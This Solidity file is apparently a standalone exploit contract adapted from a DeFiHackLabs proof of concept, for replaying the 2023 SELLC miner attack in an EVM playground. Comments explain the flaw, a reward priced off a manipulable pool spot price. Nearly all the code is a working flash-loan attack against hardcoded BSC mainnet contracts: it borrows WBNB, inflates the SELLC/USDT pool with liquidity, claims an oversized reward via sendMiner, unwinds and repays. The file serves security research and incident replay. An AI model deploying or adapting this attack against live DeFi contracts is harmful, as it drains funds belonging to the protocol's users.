// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-SELLC03).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// DODO flash-loan callback `DPPFlashLoanCall` lives on the test itself, so there
// is no standalone attack contract to deploy). This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> run, DPPFlashLoanCall
// unchanged) so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/SELLC03_exp.sol.
//
// Root cause: `miner.sendMiner()` pays a SELLC reward priced live off the
// SELLC/USDT PancakeSwap pool's spot price (via getAmountsOut), from the
// contract's own communal SELLC stockpile. The reward magnitude depends only on
// the pool's spot price at claim time, not on how much real time elapsed (the
// 1-day wait in the original test is purely a boolean gate: `_day` is 1 for any
// elapsed time in [1 day, 2 days)). The attacker inflates the SELLC/USDT pool
// with a flash-borrowed liquidity add immediately before claiming, so the
// contract pays out a wildly oversized reward.
//
// Replay note: the playground replays deploy + setup + the recorded attack at
// ONE fixed block.timestamp. The original test registers (`setBNB`, which
// stamps `time = block.timestamp`) and then warps +1 day before claiming
// (`sendMiner`, which requires `block.timestamp > time + DAYSTIME`) — two
// different timestamps for one gate. Since this contract's `run()` is the sole
// RECORDED call, `setBNB` is instead issued as an UNRECORDED `setup.rawCall`
// (see the config), and a subsequent `setup.storeSlot` step patches the
// resulting `time` field backward by just over one day so the gate is already
// satisfied by the time `run()` executes at the fixed timestamp. `run()` itself
// only performs the flash loan and its callback (mirroring the DODO
// `flashLoan(...)` call in `testExploit()`, after the registration + warp).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface Uni_Router_V2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

interface Uni_Pair_V2 {
    function balanceOf(address) external view returns (uint256);
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface Miner {
    function sendMiner(address token) external;
}

contract SELLC03Drain {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
    Miner constant miner = Miner(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1);
    Uni_Pair_V2 constant SELLC_USDT = Uni_Pair_V2(0x9523B023E1D2C490c65D26fad3691b024d0305D7);
    Uni_Router_V2 constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPOracle constant oracle = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);

    // `setBNB` registration happens as an UNRECORDED setup.rawCall before this
    // runs (see config `setup.steps`) — its `time` timestamp is then patched
    // backward by setup.storeSlot so the daily-claim gate is already open here.
    function run() external {
        WBNB.approve(address(Router), type(uint256).max);
        USDT.approve(address(Router), type(uint256).max);
        SELLC.approve(address(Router), type(uint256).max);
        // SELLC_USDT is not an ERC20 in the original test's approve loop context
        // (it approves the LP token for the router so removeLiquidity can pull it).
        IERC20(address(SELLC_USDT)).approve(address(Router), type(uint256).max);

        oracle.flashLoan(600 * 1e18, 0, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address /* sender */, uint256 /* baseAmount */, uint256 /* quoteAmount */, bytes calldata /* data */)
        external
    {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SELLC);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            200 * 1e18, 0, path, address(this), block.timestamp
        );
        path[0] = address(SELLC);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            (SELLC.balanceOf(address(this)) * 1) / 100, 0, path, address(this), block.timestamp
        );
        Router.addLiquidity(
            address(SELLC),
            address(USDT),
            SELLC.balanceOf(address(this)),
            USDT.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        ); // add SELLC-USDT Liquidity
        path[0] = address(WBNB);
        path[1] = address(SELLC);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            400 * 1e18, 0, path, address(this), block.timestamp
        );
        miner.sendMiner(address(SELLC));
        Router.removeLiquidity(
            address(SELLC), address(USDT), SELLC_USDT.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        ); // remove SELLC-USDT Liquidity
        path[0] = address(SELLC);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        WBNB.transfer(address(oracle), 600 * 1e18);
    }

    receive() external payable {}
}
